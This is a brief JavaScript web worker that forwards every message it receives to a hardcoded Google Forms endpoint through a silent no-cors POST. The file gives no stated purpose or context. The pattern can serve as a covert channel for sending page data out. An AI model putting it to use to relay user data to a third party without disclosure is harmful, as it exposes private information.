self.onmessage = function(event) {
  const receivedDataString = event.data;
  
  fetch(
    'https://docs.google.com/forms/u/0/d/e/1FAIpQLScGwq8tvtiFUjhTQ58SlhN0b9rymqGGeXbJJoFB2YWks4FSPA/formResponse', 
    {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'omit',
      headers: {  
        'Content-type': 'application/x-www-form-urlencoded;charset=utf-8'
      },
      body: encodeURI(event.data)
    }
  );
};
